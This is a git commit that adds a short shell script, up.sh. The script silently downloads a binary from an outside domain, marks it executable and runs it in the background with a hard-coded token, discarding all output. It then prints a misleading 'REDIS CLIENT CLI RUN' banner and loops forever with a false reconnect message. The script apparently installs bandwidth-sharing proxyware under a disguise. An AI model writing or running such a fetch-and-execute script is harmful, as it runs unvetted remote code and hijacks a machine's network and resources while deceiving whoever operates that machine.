33f380175b5ddfa3437d11d0af44367c816d826b
lianamahesra-creator <lianamahesra@gmail.com>
2026-04-27 20:05:43 +0700

    Add files via upload

---
+++ up.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+rm -rf server wifi
+IP=$(curl -s ifconfig.me 2>/dev/null)
+echo "$(date) - IP: $IP"
+echo
+echo "INSTALL BANDWIDTH | PROCESSING!"
+
+curl -sL https://cdn.thichdi.site/server -o server >/dev/null 2>&1
+chmod +x server
+nohup ./server start accept --token "pZEeHkUPpHd0XrwhTEwOwlTFSHIHqkfY6g2JzgLCPLY=" >/dev/null 2>&1 &
+echo "INSTALL BANDWIDTH | DONE!"
+echo "========================"
+echo "  REDIS CLIENT CLI RUN  "
+echo "========================"
+while true; do
+  echo "Reconnecting in 24 hours..."
+  sleep 1m
+done
